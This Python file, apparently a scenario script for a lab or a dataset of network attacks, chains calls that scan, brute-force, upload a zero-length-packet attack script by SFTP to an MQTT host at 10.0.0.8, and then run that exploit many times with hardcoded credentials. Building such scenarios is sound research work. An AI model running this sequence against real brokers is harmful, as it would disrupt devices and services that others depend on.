from APT import *

step_seq = [(NetstatRecStep(0), 1), (PauseStep(),),
            (Nmap192T4RecStep(0),), (PauseStep(),),
            (Nmap10T5RecStep(0), 1), (PauseStep(),),
            (NetstatRecStep(0), 1), (PauseStep(),),
            (Nmap192T4RecStep(0),), (PauseStep(),),
            (Nmap10T5RecStep(0), 1
             ), (PauseStep(),), (NetstatRecStep(0), 1
                                   ), (PauseStep(),),
            (Nmap192T4RecStep(0),), (PauseStep(),),
            (Nmap10T5RecStep(0), 1
             ), (PauseStep(),), (NetstatRecStep(0), 1
                                   ), (PauseStep(),),
            (Nmap192T4RecStep(0),), (PauseStep(),),
            (Nmap10T5RecStep(0), 1
             ), (PauseStep(),),
            (BruteForceStep(0, host="10.0.0.8"), 1
             ), (PauseStep(),),
            (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
             ), (PauseStep(),),
            (NmapBannerDiscStep("10.0.0.8", pause=0), 1
             ), (PauseStep(),), (MqttCatDiscStep("10.0.0.8", pause=0), 1
                                   ),
            (PauseStep(),),
            (NmapSubDiscStep("10.0.0.8", pause=0), 1
             ), (PauseStep(),), (PauseStep(),), (PauseStep(),),
            (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
             ), (PauseStep(),),
            (NmapBannerDiscStep("10.0.0.8", pause=0), 1
             ), (PauseStep(),), (MqttCatDiscStep("10.0.0.8", pause=0), 1
                                   ),
            (PauseStep(),),
            (NmapSubDiscStep("10.0.0.8", pause=0), 1
             ), (PauseStep(),), (PauseStep(),), (PauseStep(),),
            (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
             ), (PauseStep(),),
            (NmapBannerDiscStep("10.0.0.8", pause=0), 1
             ), (PauseStep(),), (MqttCatDiscStep("10.0.0.8", pause=0), 1
                                   ),
            (PauseStep(),),
            (NmapSubDiscStep("10.0.0.8", pause=0), 1
             ), (PauseStep(),), (PauseStep(),), (PauseStep(),),
            (NmapMQTTDiscStep("10.0.0.8", pause=0), 1
             ), (PauseStep(),),
            (NmapBannerDiscStep("10.0.0.8", pause=0), 1
             ), (PauseStep(),), (MqttCatDiscStep("10.0.0.8", pause=0), 1
                                   ),
            (PauseStep(),),
            (NmapSubDiscStep("10.0.0.8", pause=0), 1
             ), (PauseStep(),), (PauseStep(),), (PauseStep(),),
            (SftpInstStep("10.0.0.8", ["/zero_len_attack.py", "/mqtt_utilities.py"], pause=0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),), (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
                                   ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),), (NmapSubDiscStep("10.0.0.8", pause=0), 1
                                                      ), (PauseStep(),), (PauseStep(),), (PauseStep(),),
            (SftpInstStep("10.0.0.8", ["/zero_len_attack.py", "/mqtt_utilities.py"], pause=0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),), (NmapSubDiscStep("10.0.0.8", pause=0), 1
                                                      ), (PauseStep(),), (PauseStep(),), (PauseStep(),),
            (SftpInstStep("10.0.0.8", ["/zero_len_attack.py", "/mqtt_utilities.py"], pause=0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=60, pause=0), 1
             ), (PauseStep(),),
            (NetstatRecStep(0), 1
             ), (PauseStep(),), (PauseStep(),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
            (ZeroLenExploit("10.0.0.8", "client1", "pass1", mean_duration=120, pause=0), 1
             ), (PauseStep(),),
            (Nmap10T5RecStep(0),), (PauseStep(),),
